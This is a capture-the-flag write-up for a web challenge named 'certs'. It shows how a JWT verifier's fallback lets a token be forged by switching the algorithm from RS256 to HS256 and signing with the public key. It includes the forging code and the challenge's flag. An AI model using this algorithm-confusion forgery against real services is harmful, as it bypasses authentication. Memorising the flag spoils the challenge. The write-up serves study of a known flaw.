# certs
## Description
https://certs.chall.pwnoh.io
## Author
mbund
## Resources
`export.zip` - source code
## Solution
0. By auditing the source code, we can find that program use `jwt` and one of the point of `jwt hack` is to replace the `alg` value in order to pass `verify` function.
1. The fallback of `verify` function will let it pass `publicKey` in text to verify.
    ```javascript
        try {
            const result = await jose.jwtVerify(
                token,
                await jose.importSPKI(publicKey, "RS256")
            );
            return result.payload as any;
            } catch (e) {
            try {
                const result = await jose.jwtVerify(
                token,
                new TextEncoder().encode(publicKey)
                );
                return result.payload as any;
            } catch (e) {}
            }
    ```
2. Therefore since we already have the `publicKey` which was used to verify signiture in `RS256`, we can just simply change the `RS256` in `alg` to `HS256` (the symmatric encryption version of `RS256`) and encrypt it by `publicKey` to bypass the verification.
3. Comment out the first-place check under `/api/certify`.
    ```javascript
        // if (place === 1) {
        //   return new Response(
        //     "The grand winner must be manually signed by an admin.",
        //     { status: 401 }
        //   );
        // }

    ```
4. Change the code under `/api/certify` from `RS256` to `HS256`:
    ```javascript
    const token = await new jose.SignJWT({ team, place })
            .setProtectedHeader({ alg: "HS256" })
            .sign(new TextEncoder().encode(publicKey));
    ```
4. `docker-compose up` the container on local, and generate a new cert PDF encrypted by `HS256` and `publicKey`.
5. Done!
6. 💯 Is this the reason you're in first place? bctf{47_l3457_17_w45n7_4n_4c7u4l_pdf_ch4ll3n63}